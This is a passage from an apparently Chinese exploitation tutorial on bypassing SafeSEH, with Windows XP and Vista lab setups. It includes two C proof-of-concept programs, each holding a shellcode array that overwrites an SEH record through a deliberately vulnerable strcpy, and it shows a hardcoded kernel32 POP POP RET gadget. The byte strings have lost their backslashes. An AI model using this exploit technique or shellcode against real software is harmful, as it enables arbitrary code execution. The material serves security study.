>
> 事实上，next SEH域可以认为是shellcode的第一部分。
在后文中也会给出调试的过程和结果，读者还可以结合下面[这篇文章](https://blog.csdn.net/swartz_lubel/article/details/77921893)理解消化。
如果还没有理解，可以回到第一章，去看一下S.E.H分析中关于EXCEPTION_DISPOSITION
结构的介绍，相信你一定会有收获。
**2.3.2 绕过SafeSEH实战**
编译环境
WINDOWS XP HOME Editon VC++6.0
寻找Gadget
可以通过Mona插件查找格式为POP POP RET格式的代码片段。//前文已经介绍
但是通过ImmunityDebbger自身的搜索功能也是可以完成搜索的。右击代码段-搜索全部模块的命令序列 就可以进行搜索。输入 POP 某个寄存器名
RET即可找到很多匹配的字符串，寻找一个符合条件的。（没有0x00字节，没有操作敏感寄存器等）
我们找到Kernel32.DLL模块中的一段代码，地址为0x77F54F7B，WINXP没有ASLR的情况下，Kernel的基地址不发生变化，所以直接硬编码就可以用了。
调试程序
F9运行程序，程序停留在DIV指令处。调试器因为发现除0错误，所以自己断下了。
此时如果运行Shirft+F9（如果要看具体细节将F9换成F7/8），就可以继续运行.
此时我们发现程序跳转到了0x77F54F7B处了。
此时的栈地址和我们之前填充的栈的距离已经很远了，但是观察此时的ESP+8的位置（0x12FA40），发现这个位置上居然指向0x12FF1C，也就是我们的NEXT
RECORD的地址。
各位读者都知道，我们的NEXT RECORD存放的字节码为EB 06 90 90。也就是JMP SHORT 0x6.
（调试器将其翻译为跳转到0x12FF24，但是实际上JMP SHORT是相对跳转，而不是绝对地址跳转）
此时执行POP POP RET，程序就成功跳转到了JMP SHORT
0x6，然后再次跳转，进入了我们的SHELLCODE，成功弹出了Migraine专属的弹窗。
源码如下，主要参考的是《0Day漏洞分析》的SafeSEH一章。
编译环境
WINDOWS XP HOME Editon VC++6.0
    #include "stdafx.h"
    #include
    #include
    char shellcode[]=
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "xEBx06x90x90"  // Point to Next SEH record
    "x7Bx4FxF5x77" //SE handler
    //"x70xfex12x00"//SE handler
    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
    "x53xFFx57xFCx53xFFx57xF8";
    void MyExceptionhandler()
    {
    ​    printf("got an exception ,press Enter to kill the process!n");
    ​    getchar();
    ​    ExitProcess(1);
    }
    void SEH_test()
    {
    ​    char buf[200];
    ​    int zero=0;
    ​    
    ​    //__asm int 0x3;
    ​    __try{
    ​        printf("In the SEH_test!n");
    ​        strcpy(buf,shellcode);
    ​        zero=4/zero;
    ​    }
    ​    __except(MyExceptionhandler()){};
    }
    int main(int argc, char* argv[])
    {
    ​    SEH_test();
    ​    return 0;
    }
希望能构建更短的payload，尝试向前跳转方案（思路）
    #include "stdafx.h"
    #include
    #include
    char shellcode[]=
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
    "x90x90x90x90"
    "xFCx68x6Ax0Ax38x1Ex68x63x89xD1x4Fx68x32x74x91x0C"
    "x8BxF4x8Dx7ExF4x33xDBxB7x04x2BxE3x66xBBx33x32x53"
    "x68x75x73x65x72x54x33xD2x64x8Bx5Ax30x8Bx4Bx0Cx8B"
    "x49x1Cx8Bx09x8Bx69x08xADx3Dx6Ax0Ax38x1Ex75x05x95"
    "xFFx57xF8x95x60x8Bx45x3Cx8Bx4Cx05x78x03xCDx8Bx59"
    "x20x03xDDx33xFFx47x8Bx34xBBx03xF5x99x0FxBEx06x3A"
    "xC4x74x08xC1xCAx07x03xD0x46xEBxF1x3Bx54x24x1Cx75"
    "xE4x8Bx59x24x03xDDx66x8Bx3Cx7Bx8Bx59x1Cx03xDDx03"
    "x2CxBBx95x5FxABx57x61x3Dx6Ax0Ax38x1Ex75xA9x33xDB"
    "x53x68x61x69x6Ex65x68x6Dx69x67x72x8BxC4x53x50x50"
    "x53xFFx57xFCx53xFFx57xF8x90x90x90x90"
    "xE9x4FxFFxFF"  // Point to Next SEH record
    "x7Bx4FxF5x77"; //SE handler
    void MyExceptionhandler()
    {
    ​    printf("got an exception ,press Enter to kill the process!n");
    ​    getchar();
    ​    ExitProcess(1);
    }
    void SEH_test()
    {
    ​    char buf[200];
    ​    int zero=0;
    ​    
    ​    //__asm int 0x3;
    ​    __try{
    ​        printf("In the SEH_test!n");
    ​        strcpy(buf,shellcode);
    ​        zero=4/zero;
    ​    }
    ​    __except(MyExceptionhandler()){};
    }
    int main(int argc, char* argv[])
    {
    ​    SEH_test();
    ​    return 0;
    }
这个方案的局限性。如果SHELLCODE长度过长，就会发生这段代码现在的状况。
从12FF1C向前跳转到12FE70距离大于了JMP
SHORT到最大距离128字节。所以我们无法进行短跳转，如果使用唱跳转需要多一个字节的空间，也就需要从NEXT RECORD多一个字节，覆盖到SE
handler的空间。如下图所示。
当然，如果对shellcode进行精心设计，让向前跳转，从shellcode的某个位置跳转到shellcode的头部进行执行。但是这样，Exploit的稳定性就未知了。所以还是建议选择向后跳转，除非shellcode长度非常短。
###  2.4绕过重重保护实现的SEH利用
在开启全面硬件 DEP的Windows Vista下绕过SafeSEH
编译环境
WINDOWS VISTA（使用x64系统不影响实验，只要编译的PE文件是x86的即可）
VS2010
**2.4.1安全选项设置**
Windows Vista关闭ASLR
虽然绕过ASLR也是一个很有趣的过程，不过从前文的S.E.H和SafeSEH直接到DEP和ASLR的双重加持，跨度未免太大，所以决定暂时降低一些难度。
修改注册表的方式关闭比较麻烦，所以可以在VS编译的时候将“配置属性-链接器-高级-随机基址”的值修改为否即可
开启硬件DEP
和ASLR一样，在链接器中打开数据执行保护DEP。
开启GS保护
预防经典栈溢出的Stack Cookie
Windows Vista系统为系统模块全面开启了SafeSEH和DEP
全面开启SafeSEH可以防止程序跳转到开启SafeSEH到模块，也就是说我们无法通过控制SE
handler来跳转到任何开启SafeSEH的模块。导致我们无法使用kernel32.dll模块的pop pop ret实现绕过SafeSEH。在Win
XP下还可以使用kernel下到代码段进行ROP，但是Windows Vista让利用系统Dll进行ROP失去了可能性。
而DEP的开启，则是当我们通过pop pop ret直接跳转执行shellcode的时候，让栈内的shellcode无法执行。
两种安全措施的结合效果达到了1+1=3的效果，让程序固若金汤。
**2.4.2通过未开启SafeSEH的DLL绕过**
Windows
Vista大部分模块采用SafeSEH，导致通过覆盖S.E.H跳转的代码无家可归，因为都开启了SafeSEH。所以我们需要为漏洞利用创造条件，我们这里建立一个没有开启SafeSEH的DLL。
在编译选项中关闭SafeSEH(VS 2010只需要删除/SafeSEH 选项即可，默认是关闭的)
Test.cpp